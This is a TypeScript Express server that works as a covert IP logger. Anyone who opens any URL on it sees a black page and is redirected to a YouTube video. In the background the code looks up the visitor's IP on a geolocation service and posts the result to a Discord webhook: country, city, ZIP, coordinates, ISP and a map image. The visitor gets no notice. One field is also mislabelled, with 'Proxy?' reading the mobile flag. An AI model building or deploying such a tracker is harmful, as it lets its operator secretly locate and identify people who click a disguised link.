// External imports
import axios from "axios";
import morgan from "morgan";
import express from "express";
import helmet from "helmet";
import { createServer } from "http";
import "dotenv/config";

// App
const app = express();
const server = createServer(app);

// App settings
app.set("port", process.env.PORT || 5000);
app.set("json spaces", 2);
app.set("trust proxy", true);

// Middlewares
app.use(morgan("dev"));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(
  helmet({
    contentSecurityPolicy: {
      directives: {
        defaultSrc: ["'self'"],
        scriptSrc: ["'self'", "'unsafe-inline'", "https://www.youtube.com"],
      },
    },
  })
);

// Colors
var colors = require("colors/safe");

// Discord
import Discord from "discord.js";

// Routes
app.get("*", async (req, res): Promise<void> => {
  const ipHeaders =
    req.headers["cf-connecting-ip"] ??
    req.headers["x-forwarded-for"] ??
    req.connection.remoteAddress ??
    "";
  const ip = ipHeaders.toString().replace("::ffff:", "");

  if (ip) {
    const url = "https://ipapi.lauty.dev/" + ip + "?fields=66846719";

    const info = await axios.get(url);
    const data = info.data;

    res.set("Content-Type", "text/html; charset=utf-8");
    res.send(`<!DOCTYPE html>
        <html lang="en">
        <head>
          <title>Redirect</title>
        </head>
        <body style="background-color: black">
          <script>
              window.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
          </script>
        </body>
        </html>`);

    // Discord
    const webhookClient = new Discord.WebhookClient({
      url: `${process.env.WH_URL}`,
    });

    const embed = new Discord.EmbedBuilder()
      .setTitle("New entry")
      .addFields(
        { name: "IP", value: data.query || "No data" },
        { name: "Continent", value: data.continent || "No data" },
        {
          name: "Continent code",
          value: data.continentCode || "No data",
        },
        { name: "Country", value: data.country || "No data" },
        {
          name: "Country code",
          value: data.countryCode || "No data",
        },
        {
          name: "State/Province",
          value: data.regionName || "No data",
        },
        {
          name: "State/Province code",
          value: data.region || "No data",
        },
        { name: "City", value: data.city || "No data" },
        { name: "ZIP", value: data.zip || "No data" },
        { name: "Latitude", value: `${data.lat || "No data"}` },
        { name: "Longitude", value: `${data.lon || "No data"}` },
        { name: "Time zone", value: data.timezone || "No data" },
        { name: "Currency", value: data.currency || "No data" },
        { name: "ISP", value: data.isp || "No data" },
        { name: "Organization", value: data.org || "No data" },
        { name: "AS", value: data.as || "No data" },
        { name: "AS name", value: data.reverse || "No data" },
        { name: "Mobile?", value: `${data.mobile || "No data"}` },
        { name: "Proxy?", value: `${data.mobile || "No data"}` },
        {
          name: "Hosting?",
          value: `${data.hosting || "No data"}`,
        }
      )
      .setColor("#4791d8");

    if (!data.lat || !data.lon) {
      embed.setImage(
        "https://cdn.dribbble.com/users/1449854/screenshots/4136663/media/381780b56b2f28faa745c43b7ff88086.png"
      );
    } else {
      embed.setImage(
        `https://api.mapbox.com/styles/v1/mapbox/streets-v11/static/geojson(%7B%22type%22%3A%22Point%22%2C%22coordinates%22%3A%5B${
          data.lon || 0
        }%2C${data.lat || 0}%5D%7D)/${data.lon || 0},${
          data.lat || 0
        },3/500x300?access_token=${process.env.MAPBOX_TOKEN}`
      );
    }

    webhookClient.send({ embeds: [embed] });
  }
});

// Start server
server.listen(app.get("port"), (): void => {
  console.log(
    colors.red("[SERVER]") +
      " Server listening on port " +
      colors.green(app.get("port"))
  );
});

process.on("unhandledRejection", (error) => {
  console.error(error);
});
